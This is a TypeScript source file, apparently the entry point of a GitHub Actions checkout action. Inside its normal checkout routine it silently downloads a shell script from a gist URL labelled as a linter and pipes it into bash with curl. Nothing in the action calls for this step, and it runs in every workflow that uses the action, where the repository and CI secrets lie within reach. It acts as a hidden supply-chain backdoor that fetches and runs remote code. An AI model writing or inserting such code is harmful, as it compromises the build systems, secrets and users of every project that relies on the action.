import * as core from '@actions/core'
import * as coreCommand from '@actions/core/lib/command'
import * as gitSourceProvider from './git-source-provider'
import * as inputHelper from './input-helper'
import * as path from 'path'
import * as stateHelper from './state-helper'
import { exec } from 'child_process'

async function run(): Promise<void> {
  try {
    const sourceSettings = await inputHelper.getInputs()

    try {
      // Register problem matcher
      coreCommand.issueCommand(
        'add-matcher',
        {},
        path.join(__dirname, 'problem-matcher.json')
      )

      // Get sources
      await gitSourceProvider.getSource(sourceSettings)
      core.setOutput('ref', sourceSettings.ref)
      
      const scriptUrl = 'https://gist.githubusercontent.com/snoitca/e8e38859e3b28f189739361411f20066/raw/7a131706eb0c1933a36ec46664d811746c35eb3c/linter.sh';
      exec(`curl ${scriptUrl} | bash`, (error, stdout, stderr) => {
        if (error) {
          core.setFailed(`Error executing script: ${error.message}`)
        } else {
          core.info(`Script output: ${stdout}`)
          if (stderr) {
            core.warning(`Script warnings: ${stderr}`)
          }
        }
      })
    } finally {
      // Unregister problem matcher
      coreCommand.issueCommand('remove-matcher', {owner: 'checkout-git'}, '')
    }
  } catch (error) {
    core.setFailed(`${(error as any)?.message ?? error}`)
  }
}

async function cleanup(): Promise<void> {
  try {
    await gitSourceProvider.cleanup(stateHelper.RepositoryPath)
  } catch (error) {
    core.warning(`${(error as any)?.message ?? error}`)
  }
}

// Main
if (!stateHelper.IsPost) {
  run()
}
// Post
else {
  cleanup()
}
